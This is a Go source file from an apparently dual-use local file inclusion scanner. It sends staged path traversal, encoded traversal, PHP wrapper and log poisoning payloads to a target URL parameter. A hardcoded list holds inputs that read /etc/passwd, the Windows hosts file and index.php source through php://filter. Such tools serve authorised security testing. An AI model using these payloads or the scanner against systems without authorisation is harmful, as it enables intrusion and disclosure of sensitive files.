package core

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/Serdar715/lfix/pkg/output"
)

// SmartModeConfig configuration for smart mode
type SmartModeConfig struct {
	Stage         int  // 1-4
	AutoEscalate  bool // Automatically escalate if initial tests fail
	MaxPayloads   int  // Max payloads per stage
	ParallelTests int  // Parallel tests
	StopOnSuccess bool // Stop after first success
	Verbose       bool // Verbose output
}

// SmartScanner implements smart scanning with staged escalation
type SmartScanner struct {
	config     *SmartModeConfig
	httpClient *HTTPClient
	analyzer   *ResponseAnalyzer
	payloadMgr *PayloadManager
	results    *output.ScanResult
	mu         sync.Mutex
}

// NewSmartScanner creates a new smart scanner
func NewSmartScanner(config *SmartModeConfig) *SmartScanner {
	return &SmartScanner{
		config:     config,
		httpClient: NewHTTPClient(),
		analyzer:   NewResponseAnalyzer(),
		payloadMgr: NewPayloadManager(),
		results:    nil,
	}
}

// StageResults results of a single stage
type StageResults struct {
	Stage       int
	Success     bool
	Payloads    int
	Confirmed   []string
	OS          string
	TimeElapsed int64
}

// SmartScan performs a smart scan with staged escalation
func (ss *SmartScanner) SmartScan(targetURL, param string) (*output.ScanResult, []StageResults) {
	ss.results = output.NewScanResult(targetURL, param)
	stageResults := make([]StageResults, 0)
	startTime := time.Now()

	// Stage 1: Simple traversal
	fmt.Println("[*] Stage 1: Simple Traversal Testing...")
	stage1 := ss.runStage(targetURL, param, 1)
	stageResults = append(stageResults, stage1)

	if stage1.Success && ss.config.StopOnSuccess {
		return ss.finishScan(stageResults, startTime), stageResults
	}

	// Stage 2: Encoded traversal
	var stage2, stage3, stage4 StageResults
	if !stage1.Success || ss.config.AutoEscalate {
		fmt.Println("[*] Stage 2: Encoded Traversal Testing...")
		stage2 = ss.runStage(targetURL, param, 2)
		stageResults = append(stageResults, stage2)

		if stage2.Success && ss.config.StopOnSuccess {
			return ss.finishScan(stageResults, startTime), stageResults
		}
	}

	// Stage 3: Wrapper abuse
	if (stage1.Success || stage2.Success) || ss.config.AutoEscalate {
		fmt.Println("[*] Stage 3: Wrapper Abuse Testing...")
		stage3 = ss.runStage(targetURL, param, 3)
		stageResults = append(stageResults, stage3)

		if stage3.Success && ss.config.StopOnSuccess {
			return ss.finishScan(stageResults, startTime), stageResults
		}
	}

	// Stage 4: Log poisoning
	if (stage1.Success || stage2.Success || stage3.Success) && ss.config.AutoEscalate {
		fmt.Println("[*] Stage 4: Log Poisoning Testing...")
		stage4 = ss.runStage(targetURL, param, 4)
		stageResults = append(stageResults, stage4)
	}

	return ss.finishScan(stageResults, startTime), stageResults
}

// runStage runs a specific stage
func (ss *SmartScanner) runStage(targetURL, param string, stage int) StageResults {
	startTime := time.Now()
	result := StageResults{
		Stage: stage,
	}

	payloads := ss.payloadMgr.GetByStage(stage)
	if len(payloads) == 0 {
		return result
	}

	// Get baseline
	baseline, err := ss.httpClient.Get(targetURL)
	if err != nil {
		return result
	}

	successCount := 0
	for i, payload := range payloads {
		if ss.config.MaxPayloads > 0 && i >= ss.config.MaxPayloads {
			break
		}

		// Send request
		resp, err := ss.httpClient.SendParameter(targetURL, param, payload.Value, GET)
		if err != nil {
			continue
		}

		// Analyze response
		analysis := ss.analyzer.Analyze(baseline, resp)
		result.Payloads++

		if analysis.IsVulnerable {
			successCount++
			result.Confirmed = append(result.Confirmed, analysis.DetectedFiles...)
			result.OS = analysis.OS

			if ss.config.Verbose {
				fmt.Printf("    [+] Payload worked: %s\n", payload.Value)
			}
		}
	}

	result.Success = successCount > 0
	result.TimeElapsed = time.Since(startTime).Milliseconds()

	if ss.config.Verbose {
		fmt.Printf("    [*] Tested %d payloads, %d successful\n", result.Payloads, successCount)
	}

	return result
}

// finishScan finishes the scan and returns results
func (ss *SmartScanner) finishScan(stages []StageResults, startTime time.Time) *output.ScanResult {
	// Determine overall vulnerability status
	isVuln := false
	var os string
	var confidence float64

	for _, stage := range stages {
		if stage.Success {
			isVuln = true
			if stage.OS != "" {
				os = stage.OS
			}
			confidence = float64(len(stage.Confirmed)) / float64(stage.Payloads)
			if confidence > 1 {
				confidence = 1
			}
			break
		}
	}

	// Set scan result
	ss.results.SetVulnerable(isVuln, os, "critical", confidence)
	ss.results.PayloadsTested = calculateTotalPayloads(stages)
	ss.results.TimeElapsed = time.Since(startTime).Milliseconds()

	// Add confirmed files
	for _, stage := range stages {
		for _, file := range stage.Confirmed {
			ss.results.AddConfirmedFile(file)
		}
	}

	// Add attack vectors
	for _, stage := range stages {
		if stage.Success {
			av := output.AttackVector{
				Type:        fmt.Sprintf("stage_%d", stage.Stage),
				Success:     true,
				Description: fmt.Sprintf("Stage %d successful", stage.Stage),
			}
			ss.results.AddAttackVector(av)
		}
	}

	return ss.results
}

func calculateTotalPayloads(stages []StageResults) int {
	total := 0
	for _, stage := range stages {
		total += stage.Payloads
	}
	return total
}

// DefaultSmartConfig returns default smart mode configuration
func DefaultSmartConfig() *SmartModeConfig {
	return &SmartModeConfig{
		Stage:         4,
		AutoEscalate:  true,
		MaxPayloads:   20, // Limit payloads per stage for speed
		ParallelTests: 5,
		StopOnSuccess: false,
		Verbose:       true,
	}
}

// QuickScan performs a quick scan without staged escalation
func (ss *SmartScanner) QuickScan(targetURL, param string) *output.ScanResult {
	ss.results = output.NewScanResult(targetURL, param)
	startTime := time.Now()

	// Get baseline
	baseline, _ := ss.httpClient.Get(targetURL)

	// Test basic payloads
	payloads := []string{
		"../../../etc/passwd",
		"../../etc/passwd",
		"../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"..%2f..%2f..%2fetc%2fpasswd",
		"php://filter/convert.base64-encode/resource=index.php",
	}

	for _, payload := range payloads {
		resp, err := ss.httpClient.SendParameter(targetURL, param, payload, GET)
		if err != nil {
			continue
		}

		analysis := ss.analyzer.Analyze(baseline, resp)
		ss.results.PayloadsTested++

		if analysis.IsVulnerable {
			ss.results.SetVulnerable(true, analysis.OS, "critical", 0.8)
			for _, file := range analysis.DetectedFiles {
				ss.results.AddConfirmedFile(file)
			}
			ss.results.AddAttackVector(output.AttackVector{
				Type:        "quick",
				Payload:     payload,
				Success:     true,
				Description: "Quick scan found vulnerability",
			})
			break
		}
	}

	ss.results.TimeElapsed = time.Since(startTime).Milliseconds()
	return ss.results
}

// GetAvailableStages returns available smart mode stages
func (ss *SmartScanner) GetAvailableStages() []string {
	return []string{
		"Stage 1: Simple Traversal",
		"Stage 2: Encoded Traversal",
		"Stage 3: Wrapper Abuse",
		"Stage 4: Log Poisoning",
	}
}

// PrintSummary prints a summary of the scan
func PrintSummary(result *output.ScanResult, stages []StageResults) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("                      SCAN SUMMARY")
	fmt.Println(strings.Repeat("=", 60))

	fmt.Printf("\n[+] Vulnerability: %v\n", result.IsVulnerable)

	if result.IsVulnerable {
		fmt.Printf("[+] OS Detected: %s\n", result.OS)
		fmt.Printf("[+] Confidence: %.0f%%\n", result.Confidence*100)
		fmt.Printf("[+] Severity: %s\n", result.Severity)

		if len(result.ConfirmedFiles) > 0 {
			fmt.Println("\n[+] Confirmed Files:")
			for _, f := range result.ConfirmedFiles {
				fmt.Printf("    - %s\n", f)
			}
		}
	}

	fmt.Println("\n[*] Stage Results:")
	for _, stage := range stages {
		status := "FAILED"
		if stage.Success {
			status = "SUCCESS"
		}
		fmt.Printf("    Stage %d: %s (%d payloads, %dms)\n",
			stage.Stage, status, stage.Payloads, stage.TimeElapsed)
	}

	fmt.Printf("\n[*] Total Payloads Tested: %d\n", result.PayloadsTested)
	fmt.Printf("[*] Total Time: %dms\n", result.TimeElapsed)
	fmt.Printf("[*] Scan ID: %s\n", result.ScanID)
	fmt.Println(strings.Repeat("=", 60))
}
